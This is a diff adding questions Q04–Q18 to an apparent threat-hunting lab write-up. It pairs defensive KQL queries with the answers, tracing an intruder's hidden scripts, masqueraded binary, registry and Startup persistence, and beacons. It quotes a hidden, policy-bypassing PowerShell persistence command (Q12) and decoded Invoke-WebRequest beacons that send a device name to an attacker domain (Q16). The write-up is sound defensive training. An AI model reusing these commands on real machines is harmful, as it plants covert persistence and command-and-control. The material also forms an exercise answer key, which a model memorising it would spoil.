@@ -262,3 +262,369 @@ DeviceLogonEvents
 **Answer:** `None` — no further lateral movement detected.
 
 ![Q03 — Onward Movement](assets/q03-onward-movement.png)
+
+---
+
+## Q04 — First Operator Script
+
+**Hunt Lead:** "After lateral movement, what's the first script the operator launched under their own account context? Full path."
+
+**Finding:** The first script launched under the operator's account context was a hidden PowerShell script run from the user-profile PHTG directory.
+
+**Key Query:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:48:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where AccountName == "vmadminusername"
+| where FileName == "powershell.exe"
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc
+| take 1
+```
+
+**MITRE:** T1059.001 — PowerShell  
+**Answer:** `C:\Users\vmAdminUsername\Documents\PHTG\_.ps1`
+
+![Q04 — First Operator Script](assets/q04-first-operator-script.png)
+
+---
+
+## Q05 — Operator Concealment Flags
+
+**Hunt Lead:** "Look at the command line that invoked the Q04 script. Two PowerShell flags signal operator intent. Name both, with their values."
+
+**Finding:** The operator ran all scripts with flags designed to hide execution from the user and bypass security controls.
+
+**Answer:**
+```powershell
+-WindowStyle Hidden
+-ExecutionPolicy Bypass
+```
+
+**MITRE:** T1564.003 — Hidden Window  
+
+![Q05 — Concealment Flags](assets/q05-concealment-flags.png)
+
+---
+
+## Q06 — Staging Directory
+
+**Hunt Lead:** "Where did the operator stage their tooling? I want the root directory under ProgramData, not the user-profile path. Three subdirectories sit underneath it."
+
+**Finding:** All operator tooling was staged under a directory masquerading as a legitimate health-cloud software installation.
+
+**Key Query:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:48:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where AccountName == "vmadminusername"
+| where ProcessCommandLine contains "-File"
+| project TimeGenerated, FileName, ProcessCommandLine
+| order by TimeGenerated asc
+| take 5
+```
+
+**MITRE:** T1036 — Masquerading  
+**Answer:** `C:\ProgramData\PHTG\HealthCloud`
+
+![Q06 — Staging Directory](assets/q06-staging-directory.png)
+
+---
+
+## Q07 — Concealment Pattern
+
+**Hunt Lead:** "The operator used attrib to hide artefacts across the HealthCloud workspace. Two top-level staging directories under it took the bulk of the hiding. Name both, give the count of attribute modifications bucketed to each, and say which got the heavier treatment."
+
+**Finding:** The operator applied hidden+system attributes across two subdirectories, with the primary tooling cache receiving significantly more treatment.
+
+**Key Queries:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where FileName == "attrib.exe"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+```
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where FileName == "attrib.exe"
+| extend Dir = case(
+    ProcessCommandLine contains "\\Cache\\", "Cache",
+    ProcessCommandLine contains "\\TempCache\\", "TempCache",
+    "other")
+| summarize Count = count() by Dir
+| order by Count desc
+```
+
+**MITRE:** T1564 — Hide Artifacts  
+**Answer:** `Cache` (17 modifications) and `TempCache` (2 modifications) — Cache received the heavier treatment.
+
+![Q07 — Attrib Commands](assets/q07-attrib-commands.png)
+![Q07 — Attrib Counts](assets/q07-attrib-counts.png)
+
+---
+
+## Q08 — LOLBin Masquerade Identification
+
+**Hunt Lead:** "Several processes on phtg-01 show FileName different to OriginalFileName. One is operator tooling. Name the executable, name what it claims to be, and explain how you separated it from the noise."
+
+**Finding:** The implant spoofed a legitimate Windows binary using VersionInfo tampering. All other FileName/OriginalFileName mismatches were case-only variations of the same legitimate binary; only the operator's tool had a completely different OriginalFileName and ran from the staging path instead of a system directory.
+
+**Key Query:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where AccountName == "vmadminusername"
+| where FileName != ProcessVersionInfoOriginalFileName
+| where ProcessVersionInfoOriginalFileName != ""
+| project TimeGenerated, FileName, ProcessVersionInfoOriginalFileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated desc
+```
+
+**MITRE:** T1036.003 — Rename System Utilities  
+**Answer:** `PHtGHealthCloudSvc.exe` masqueraded as `bitsadmin.exe`
+
+![Q08 — LOLBin Masquerade](assets/q08-lolbin-masquerade.png)
+
+---
+
+## Q09 — Registry Activity Volume
+
+**Hunt Lead:** "Volume check. How many registry modification events fired under vmadminusername on phtg-01 AFTER lateral movement?"
+
+**Finding:** High registry event volume is expected after lateral movement — the bulk is OS/application churn, not operator activity.
+
+**Key Query:**
+```kql
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| count
+```
+
+**Answer:** `280`
+
+![Q09 — Registry Volume](assets/q09-registry-volume.png)
+
+---
+
+## Q10 — Persistence Signal Isolation
+
+**Hunt Lead:** "280 events is mostly noise: Desktop themes, MUI cache, COM CLSID re-registration. Filter the user-context churn out. Which registry path actually matters for persistence?"
+
+**Finding:** Filtering out CLSID, MuiCache, and Themes leaves a small set of keys. The Run key stands out as operator-written rather than OS-generated.
+
+**Key Query:**
+```kql
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| where RegistryKey !contains "CLSID"
+| where RegistryKey !contains "MuiCache"
+| where RegistryKey !contains "Themes"
+| where RegistryKey contains "Run" or RegistryKey contains "Startup" or RegistryKey contains "Services" or RegistryKey contains "Schedule"
+| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
+```
+
+**MITRE:** T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys  
+**Answer:** `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
+![Q10 — Persistence Signal](assets/q10-persistence-signal.png)
+
+---
+
+## Q11 — Run Key Value Name
+
+**Hunt Lead:** "The Run key from Q10 carries multiple values. Edge auto-launch is legitimate. The operator's isn't. Which value name points to their tooling?"
+
+**Finding:** Multiple RegistryValueSet writes on the Run key — most are `msedge.exe` auto-launch. One value points to a script in the ProgramData staging path.
+
+**Key Query:**
+```kql
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| where RegistryKey contains "CurrentVersion\\Run"
+| where ActionType == "RegistryValueSet"
+| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
+```
+
+**MITRE:** T1547.001  
+**Answer:** `PHTGHealthCloudTray`
+
+![Q11 — Run Key Value](assets/q11-run-key-value.png)
+
+---
+
+## Q12 — Run Key Persistence Command
+
+**Hunt Lead:** "What's the full command the operator configured to run at user logon? RegistryValueData carries it."
+
+**Finding:** The RegistryValueData for `PHTGHealthCloudTray` shows a hidden PowerShell invocation of a script from the `Bin` staging subdirectory — a different subdirectory from the Cache path used by other scripts.
+
+**Key Query:**
+```kql
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| where RegistryKey contains "CurrentVersion\\Run"
+| where ActionType == "RegistryValueSet"
+| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
+```
+
+**MITRE:** T1547.001  
+**Answer:**
+```powershell
+powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
+```
+
+![Q12 — Run Key Command](assets/q12-run-key-command.png)
+
+---
+
+## Q13 — Second Persistence Mechanism
+
+**Hunt Lead:** "The Run key isn't the operator's only persistence. They dropped a second mechanism in a Windows folder that runs at logon. Find the artefact."
+
+**Finding:** A `.lnk` file was created in the Startup folder — a second logon-triggered persistence mechanism operating independently of the Run key.
+
+**Key Query:**
+```kql
+DeviceFileEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where FolderPath contains "Startup"
+| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+
+**MITRE:** T1547.001  
+**Answer:** `PHTG HealthCloud.lnk`
+
+![Q13 — Startup LNK](assets/q13-startup-lnk.png)
+
+---
+
+## Q14 — Third Persistence Mechanism
+
+**Hunt Lead:** "The operator made a system-level (HKLM) registry change on phtg-01. It's not persistence in the classic sense — it gives their tooling a different capability. Identify the key path."
+
+**Finding:** The operator registered a custom EventLog source under HKLM, allowing the implant to write to the Windows Event Log under its own brand name — making activity blend into normal log streams.
+
+**Key Query:**
+```kql
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| where RegistryKey startswith "HKEY_LOCAL_MACHINE"
+| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
+```
+
+**MITRE:** T1112 — Modify Registry  
+**Answer:** `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud`
+
+![Q14 — HKLM Registry](assets/q14-hklm-registry.png)
+
+---
+
+## Q15 — Tooling Healthcheck Loop
+
+**Hunt Lead:** "The masquerade binary from Q08 runs in a loop, beaconing with /healthcheck at regular short intervals. How many healthcheck executions fired during post-access activity?"
+
+**Finding:** The implant ran a persistent beacon loop throughout the operator's session, checking in at short intervals to confirm the implant was still alive.
+
+**Key Query:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where ProcessVersionInfoOriginalFileName =~ "bitsadmin.exe"
+| count
+```
+
+**MITRE:** T1071.001 — Application Layer Protocol: Web Protocols  
+**Answer:** `22`
+
+![Q15 — Healthcheck Loop](assets/q15-healthcheck-loop.png)
+
+---
+
+## Q16 — Encoded Beacon Endpoints
+
+**Hunt Lead:** "Alongside the SvcExe healthcheck loop, the operator fired two encoded PowerShell beacons. Decode both. What endpoints did they contact? Report both in chronological order."
+
+**Finding:** Both beacons used `-EncodedCommand` to hide their targets. `base64_decode_tostring()` in KQL recovers the full `Invoke-WebRequest` commands.
+
+**Key Query:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where ProcessCommandLine contains "EncodedCommand"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+```
+
+**Decoded Payloads:**
+```powershell
+Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?flag=FLAG-09&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
+
+Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
+```
+
+**MITRE:** T1027 — Obfuscated Files or Information, T1071 — Application Layer Protocol  
+**Answer:** `status.health-cloud.cc/api/checkin` then `status.health-cloud.cc/api/status` — parent domain `health-cloud.cc`
+
+![Q16 — Encoded Beacons](assets/q16-encoded-beacons.png)
+![Q16 — Beacon 1 Decoded](assets/q16-beacon-1-decoded.png)
+![Q16 — Beacon 2 Decoded](assets/q16-beacon-2-decoded.png)
+
+---
+
+## Q17 — Two Beacons, Why?
+
+**Hunt Lead:** "The operator runs TWO beaconing mechanisms in parallel. The SvcExe healthcheck loop AND the encoded PowerShell beacons. Why? What's the operational benefit of running both?"
+
+**Finding:** Dual-channel C2 is a deliberate operational decision — not redundancy for its own sake.
+
+**MITRE:** T1090 — Proxy / Multi-hop C2  
+**Answer:** Resiliency — if one channel is detected and cut, the operator maintains access via the other. The two channels also serve different functions (`/healthcheck` for implant liveness vs `/api/checkin` and `/api/status` for operator tasking), allowing each to be optimised independently without risking full C2 loss.
+
+![Q17 — Dual Channel C2](assets/q17-dual-channel-c2.png)
+
+---
+
+## Q18 — Deployment Pattern Recognition
+
+**Hunt Lead:** "An outbound connection fires at 10:12:16. PHtGHealthCloudSvc.exe launches at 10:12:17. A 1-second gap. What deployment pattern is the operator using?"
+
+**Finding:** The pre-staged PS1 script (`task_FLAG-01.ps1`) makes an outbound HTTPS call to `updates.health-cloud.cc` — this is the download step. One second later it launches the retrieved binary — this is the execute step. The script already existed on disk; the connection was not to download the script but to fetch the implant binary itself.
+
+**Key Query:**
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+```
+
+**MITRE:** T1105 — Ingress Tool Transfer  
+**Answer:** Download then execute — a pre-staged PowerShell script calls out to `updates.health-cloud.cc` to fetch `PHtGHealthCloudSvc.exe` (T1105 ingress tool transfer), then immediately launches it; the outbound HTTPS connection is the link between the two steps.
+
+![Q18 — Deployment Pattern](assets/q18-deployment-pattern.png)
